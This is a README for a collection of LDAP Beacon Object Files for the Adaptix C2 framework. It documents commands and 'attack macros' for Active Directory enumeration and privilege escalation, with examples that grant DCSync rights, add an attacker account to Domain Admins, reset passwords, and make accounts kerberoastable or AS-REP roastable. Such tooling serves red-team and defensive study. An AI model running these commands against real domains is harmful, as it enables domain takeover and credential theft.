# LDAP BOF Collection

Collection of many LDAP bofs for domain enumeration and privilege escalation. This project was created for use with the Adaptix C2, and has a mapping file which registers commands under the `ldap` prefix. To see usage for any command, run `help ldap {command}`.

## Command Reference

### View Usage

```bash
help ldap {command}
```

### Enumeration Commands (GET)

| Command            | Description                                                    | Usage Example                                                                    |
|--------------------|----------------------------------------------------------------|----------------------------------------------------------------------------------|
| `get-users`        | List all users in the domain                                   | `ldap get-users [-ou ou_path] [-dc dc_fqdn] [-a attributes] [--ldaps]`           |
| `get-computers`    | List all computers in the domain                               | `ldap get-computers [-ou ou_path] [-dc dc_fqdn] [-a attributes] [--ldaps]`       |
| `get-groups`       | List all groups in the domain                                  | `ldap get-groups [-ou ou_path] [-dc dc_fqdn] [-a attributes] [--ldaps]`          |
| `get-usergroups`   | List all groups a user is a member of                          | `ldap get-usergroups <user> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`               |
| `get-groupmembers` | List all members of a group                                    | `ldap get-groupmembers <group> [-ou ou_path] [-dc dc_fqdn]`                      |
| `get-object`       | Get all attributes of an object                                | `ldap get-object <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                 |
| `get-maq`          | Get machine account quota (ms-DS-MachineAccountQuota)          | `ldap get-maq [-dc dc_fqdn] [--ldaps]`                                           |
| `get-domaininfo`   | Query domain information from rootDSE                          | `ldap get-domaininfo [-dc dc_fqdn] [--ldaps]`                                    |
| `get-writable`     | Find objects you have write access to                          | `ldap get-writable [-ou ou_path] [-dc dc_fqdn] [--ldaps] [--detailed]`           |
| `get-delegation`   | Get delegation configuration for an object                     | `ldap get-delegation <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`             |
| `get-uac`          | Get UAC flags for an object                                    | `ldap get-uac <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                    |
| `get-attribute`    | Get specific attribute values (comma-separated list supported) | `ldap get-attribute <target> <attributes> [-ou ou_path] [-dc dc_fqdn] [--ldaps]` |
| `get-spn`          | Get SPNs for an object                                         | `ldap get-spn <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                    |
| `get-acl`          | Get ACL/security descriptor for an object                      | `ldap get-acl <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps] [--resolve]`        |
| `get-rbcd`         | Get RBCD configuration for an object                           | `ldap get-rbcd <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                   |

### Creation Commands (ADD)

| Command           | Description                                   | Usage Example                                                                                                                                              |
|-------------------|-----------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `add-user`        | Add a user to the domain                      | `ldap add-user <username> <password> [-fn firstname] [-ln lastname] [-email email] [--disabled] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                     |
| `add-computer`    | Add a computer to the domain                  | `ldap add-computer <computer> [-p password] [-ou ou_path] [-dc dc_fqdn] [--disabled] [--ldaps]`                                                            |
| `add-group`       | Add a group to the domain                     | `ldap add-group <groupname> [-desc description] [-type type] [-scope scope] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                         |
| `add-groupmember` | Add a member to a group                       | `ldap add-groupmember <group> <member> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                              |
| `add-ou`          | Add an organizational unit                    | `ldap add-ou <ou_name> [-desc description] [-parent parent_ou] [-dc dc_fqdn] [--ldaps]`                                                                    |
| `add-sidhistory`  | Add a SID to an object's sidHistory attribute | `ldap add-sidhistory <target> <sid_source> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                          |
| `add-spn`         | Add an SPN to a object                        | `ldap add-spn <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                        |
| `add-attribute`   | Add a value to an attribute                   | `ldap add-attribute <target> <attribute> <value> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                    |
| `add-uac`         | Add UAC flags to an object                    | `ldap add-uac <target> <flags> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                      |
| `add-delegation`  | Add a delegation SPN to an object             | `ldap add-delegation <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                 |
| `add-ace`         | Add an ACE to an object's DACL                | `ldap add-ace <target> <trustee> <rights> [-type ace_type] [-flags flags] [-guid guid] [-inherit-guid inherit_guid] [-ou ou_path] [-dc dc_fqdn] [--ldaps]` |
| `add-rbcd`        | Add an RBCD delegation                        | `ldap add-rbcd <target> <delegate> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                  |

### Modification Commands (SET)

| Command          | Description                                      | Usage Example                                                                           |
|------------------|--------------------------------------------------|-----------------------------------------------------------------------------------------|
| `set-password`   | Set/reset a user's password                      | `ldap set-password <target> <password> [-old old_password] [-ou ou_path] [-dc dc_fqdn]` |
| `set-spn`        | Set/replace all SPNs on an object                | `ldap set-spn <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                     |
| `set-delegation` | Set/replace delegation SPNs                      | `ldap set-delegation <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`              |
| `set-attribute`  | Set/replace an attribute value                   | `ldap set-attribute <target> <attribute> <value> [-ou ou_path] [-dc dc_fqdn] [--ldaps]` |
| `set-uac`        | Set UAC flags (replaces all)                     | `ldap set-uac <target> <flags> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                   |
| `set-owner`      | Set the owner of an object (requires WriteOwner) | `ldap set-owner <target> <owner> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                 |

### Other Commands

| Command       | Description                      | Usage Example                                                                                |
|---------------|----------------------------------|----------------------------------------------------------------------------------------------|
| `move-object` | Move an object to a different OU | `ldap move-object <object> <destination> [-n newname] [-ou ou_path] [-dc dc_fqdn] [--ldaps]` |

### Removal Commands (REMOVE)

| Command              | Description                            | Usage Example                                                                                                                            |
|----------------------|----------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
| `remove-groupmember` | Remove a member from a group           | `ldap remove-groupmember <group> <member> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                         |
| `remove-object`      | Remove an object from the domain       | `ldap remove-object <object> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                      |
| `remove-delegation`  | Remove a delegation SPN                | `ldap remove-delegation <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                            |
| `remove-spn`         | Remove an SPN from an object           | `ldap remove-spn <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                   |
| `remove-attribute`   | Remove an attribute or attribute value | `ldap remove-attribute <target> <attribute> [-value value] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                        |
| `remove-ace`         | Remove an ACE from an object's DACL    | `ldap remove-ace <target> [-trustee trustee] [-rights rights] [-type ace_type] [-index ace_index] [-ou ou_path] [-dc dc_fqdn] [--ldaps]` |
| `remove-rbcd`        | Remove an RBCD delegation              | `ldap remove-rbcd <target> <delegate> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                             |
| `remove-uac`         | Remove UAC flags from an object        | `ldap remove-uac <target> <flags> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                 |

### Attack Macros

These macros simplify common AD exploitation techniques by wrapping multiple operations:

| Macro                 | Description                                         | Usage Example                                                                                                                                              |
|-----------------------|-----------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `add-genericall`      | Add a GenericAll ACE to an object's DACL            | `ldap add-genericall <target> <trustee> [-type ace_type] [-flags flags] [-guid guid] [-inherit-guid inherit_guid] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`   |
| `add-genericwrite`    | Add a GenericWrite ACE to an object's DACL          | `ldap add-genericwrite <target> <trustee> [-type ace_type] [-flags flags] [-guid guid] [-inherit-guid inherit_guid] [-ou ou_path] [-dc dc_fqdn] [--ldaps]` |
| `add-asreproastable`  | Make a user AS-REP roastable (set DONT_REQ_PREAUTH) | `ldap add-asreproastable <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                   |
| `add-dcsync`          | Add DCSync ACEs to an object's DACL                 | `ldap add-dcsync <target> <trustee> [-type ace_type] [-flags flags] [-guid guid] [-inherit-guid inherit_guid] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`       |
| `add-unconstrained`   | Enable unconstrained delegation on an object        | `ldap add-unconstrained <target> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                    |
| `add-constrained`     | Set/replace delegation SPNs                         | `ldap add-constrained <target> <spn> [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                                                                |
| `remove-genericall`   | Remove a GenericAll ACE from an object's DACL       | `ldap remove-genericall <target> <trustee> [-type ace_type] [-index ace_index] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                      |
| `remove-genericwrite` | Remove a GenericWrite ACE from an object's DACL     | `ldap remove-genericwrite <target> <trustee> [-type ace_type] [-index ace_index] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                    |
| `remove-dcsync`       | Remove DCSync ACEs from an object's DACL            | `ldap remove-dcsync <target> <trustee> [-type ace_type] [-index ace_index] [-ou ou_path] [-dc dc_fqdn] [--ldaps]`                                          |

## Usage Examples

### Basic Enumeration
```bash
# List all domain users
ldap get-users

# List computers in specific OU
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"

# Query user's group memberships
ldap get-usergroups jane.doe

# Find objects you can modify
ldap get-writable --detailed
```

### User/Computer Creation
```bash
# Create new user
ldap add-user jane.doe Password123!

# Create computer account
ldap add-computer TESTCOMP -p Password123!

# Add user to Domain Admins
ldap add-groupmember "Domain Admins" jane.doe
```

### Password & Attribute Manipulation
```bash
# Change user password
ldap set-password targetuser Password123!

# Make user kerberoastable
ldap add-spn targetuser HTTP/fake.service

# Make user AS-REP roastable
ldap add-asreproastable targetuser
```

### Delegation Attacks
```bash
# Configure unconstrained delegation
ldap add-unconstrained WS01$

# Configure constrained delegation
ldap add-constrained WS02$ CIFS/DC01.corp.local

# Configure RBCD
ldap add-rbcd DC01$ ATTACKER$
```

### ACL/Permission Manipulation
```bash
# View object's ACL
ldap get-acl "CN=AdminUser,CN=Users,DC=corp,DC=local"

# Grant DCSync rights
ldap add-dcsync "DC=corp,DC=local" eviluser

# Grant GenericAll on user
ldap add-genericall targetuser attackeruser

# Remove specific ACE
ldap remove-ace targetuser -index 5
```

### LDAPS Usage
```bash
# Use LDAPS (port 636) for sensitive operations
ldap set-password targetuser NewP@ss789 --ldaps
ldap add-user secretuser P@ss123 --ldaps
```

### Targeting Specific DC
```bash
# Target specific domain controller
ldap get-users -dc 192.168.1.10
ldap add-groupmember "Domain Admins" attacker -dc 192.168.1.10
```


## Technical Details

### Authentication
All LDAP operations use the current beacon's security context. The toolkit automatically:
- Retrieves current user credentials
- Establishes authenticated LDAP binds
- Negotiates signing/sealing for LDAP
- Handles LDAPS certificate validation (accepts all)

Something I discovered in testing that may or may not be relevant to you: 

### DN vs Username Detection
Commands automatically detect input format:
- **Distinguished Names** - Match pattern: `CN=...,DC=...`
- **Usernames** - Simple alphanumeric strings
- Automatic search and conversion when needed

### LDAPS Certificate Handling
The toolkit includes a permissive certificate callback that accepts all server certificates, useful for environments with self-signed certificates or certificate mismatches.

### Common Permissions Required
- **User/Computer Creation** - Write access to target OU, may require specific extended rights
- **Group Modifications** - Write access to group object
- **Password Changes** - "Reset Password" or "Change Password" rights
- **ACL Modifications** - WriteDACL permission on target object
- **Delegation** - Write to `msDS-AllowedToActOnBehalfOfOtherIdentity` or `userAccountControl`

## Troubleshooting

### Connection Issues
```bash
# Test basic connectivity
ldap get-domaininfo

# Try explicit DC specification
ldap get-domaininfo -dc 192.168.1.10

# Use LDAPS if port 389 is blocked
ldap get-domaininfo --ldaps
```

### Permission Errors
- Verify current user context: `whoami`
- Check object permissions: `ldap get-acl {target}`
- Use `ldap get-writable` to find modifiable objects

### Object Not Found
```bash
# Use distinguished name instead of username
ldap get-object "CN=jane.doe,CN=Users,DC=corp,DC=local"

# Specify search OU
ldap get-users -ou "OU=Employees,DC=corp,DC=local"
```

## Credits

- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [ldapsearch bof](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
